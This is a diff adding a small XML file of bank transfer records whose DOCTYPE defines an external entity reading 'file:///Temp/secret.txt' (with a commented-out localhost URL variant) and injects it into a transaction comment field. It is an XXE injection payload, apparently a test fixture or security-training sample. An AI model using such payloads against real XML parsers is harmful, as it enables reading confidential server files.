@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE transactions [
+        <!ELEMENT fromAccountNo (#PCDATA)>
+        <!ELEMENT toAccountNo (#PCDATA)>
+        <!ELEMENT amount (#PCDATA)>
+        <!ELEMENT currency (#PCDATA)>
+        <!ELEMENT comment (#PCDATA)>
+        <!ELEMENT transaction (fromAccountNo, toAccountNo, amount, currency, comment)>
+        <!ELEMENT transactions (transaction*)>
+<!--        <!ENTITY xxe SYSTEM 'http://127.0.0.1:8080/xml/secret.txt'>-->
+        <!ENTITY xxe SYSTEM 'file:///Temp/secret.txt'>
+        ]>
+<transactions>
+    <transaction>
+        <fromAccountNo>1-123456-01</fromAccountNo>
+        <toAccountNo>1-123456-02</toAccountNo>
+        <amount>100</amount>
+        <currency>CHF</currency>
+        <comment>&xxe;</comment>
+    </transaction>
+</transactions>
